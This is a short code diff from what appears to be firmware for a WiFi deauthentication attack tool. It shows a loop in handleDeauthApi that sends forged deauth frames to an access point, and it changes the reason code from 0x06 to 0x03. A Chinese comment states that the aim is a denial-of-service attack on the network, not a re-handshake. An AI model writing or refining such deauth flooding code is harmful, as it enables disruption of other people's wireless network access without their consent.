@@ -72,7 +72,7 @@ void handleDeauthApi(HttpClient& client) {
     for (int r = 0; r < rounds; r++) {
         for (int p = 0; p < 10; p++) {
             // 伪造客户端单方向往AP发送deauth帧已经足够，目的不是尽快触发重新握手而是DoS攻击
-            wifi_tx_deauth_frame_ext(mac, bssid, bssid, 0x06);
+            wifi_tx_deauth_frame_ext(mac, bssid, bssid, 0x03);  // reason是客户端正常断开，但其实无所谓
             delayMicroseconds(100);
         }
         if (r < rounds - 1) {
